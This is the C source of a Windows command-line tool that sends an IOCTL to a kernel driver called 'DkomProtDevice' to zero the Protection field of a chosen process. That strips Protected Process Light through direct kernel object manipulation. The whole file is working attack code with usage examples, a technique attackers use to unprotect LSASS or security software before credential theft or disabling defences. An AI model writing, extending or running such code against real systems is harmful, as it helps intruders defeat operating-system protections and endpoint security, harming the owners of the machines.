#include <windows.h>
#include <stdio.h>

#define IOCTL_ZERO_PROTECTION CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct _PROTECTION_REQUEST {
    ULONG ProcessId;
    ULONG ProtectionOffset;
} PROTECTION_REQUEST, *PPROTECTION_REQUEST;

int main(int argc, char* argv[])
{
    if (argc < 2 || argc > 3) {
        printf("Usage: %s <PID> [ProtectionOffset_Hex_Optional]\n", argv[0]);
        printf("Example (Auto-resolve): %s 4560\n", argv[0]);
        printf("Example (Manual):       %s 4560 0x87A\n", argv[0]);
        return 1;
    }

    PROTECTION_REQUEST req = { 0 };
    req.ProcessId = (ULONG)atoi(argv[1]);
    
    if (argc == 3) {
        req.ProtectionOffset = (ULONG)strtoul(argv[2], NULL, 16);
    } else {
        req.ProtectionOffset = 0; // 0 indica al driver que use el selector dinámico por build
        printf("[*] No offset provided. Driver will resolve it dynamically based on Windows build.\n");
    }

    HANDLE hDevice = CreateFileA(
        "\\\\.\\DkomProtDevice",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open device handle. Error: %lu\n", GetLastError());
        return 1;
    }

    DWORD bytesReturned = 0;
    BOOL result = DeviceIoControl(
        hDevice,
        IOCTL_ZERO_PROTECTION,
        &req,
        sizeof(req),
        NULL,
        0,
        &bytesReturned,
        NULL
    );

    if (!result) {
        DWORD err = GetLastError();
        printf("[-] DeviceIoControl failed. Win32 Error: %lu (0x%08lX)\n", err, err);
    } else {
        printf("[+] Success! Process Protection field zeroed for PID %lu.\n", req.ProcessId);
    }

    CloseHandle(hDevice);
    return result ? 0 : 1;
}
